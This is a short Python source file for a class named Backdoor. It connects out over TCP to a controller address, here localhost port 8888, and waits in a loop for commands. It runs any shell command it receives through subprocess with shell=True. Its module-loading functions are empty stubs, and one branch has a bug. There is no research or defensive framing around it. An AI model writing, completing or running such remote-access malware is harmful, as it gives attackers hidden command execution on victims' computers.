import socket
import subprocess

class Backdoor:
    def __init__(self, server_ip, server_port):
        self.conn = None
        self.server_ip = server_ip
        self.server_port = server_port

    def start(self):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            self.conn.connect((self.server_ip, self.server_port))
        finally: pass
        while True:
            self.__parse_command()

    def __create_connection(self):
        pass

    def __parse_command(self):
        """
        - cmd
            cmd # mkdir C:/Users/User/Desktop/Test
        - mod
            mod # load
            mod # start
            mod # stop
            mod # remove
            mod # <name> <func_name>
        """
        command = self.conn.recv(1024).decode()
        command = command.split("#")
        if command[0] == "cmd":
            self.__execute_shell_command(command[1])
        elif command[0] == "mod":
            command2 = command.split(" ")
            if command2[0] == "load":
                self.__load_module(command2[1])
            elif command2[0] == "start":
                self.__start_module(command2[1])
            elif command2[0] == "stop":
                self.__stop_module(command2[1])
            elif command2[0] == "remove":
                self.__remove_module(command2[1])
            else:
                self.__call_module(command2[0], command2[1])

    def __execute_shell_command(self, command):
        subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)

    def __load_module(self, module_name):
        pass

    def __start_module(self, module_name):
        pass

    def __stop_module(self, module_name):
        pass

    def __remove_module(self, module_name):
        pass

    def __call_module(self, module_name, func_name):
        pass


if __name__ == "__main__":
    Backdoor("127.0.0.1", 8888).start()
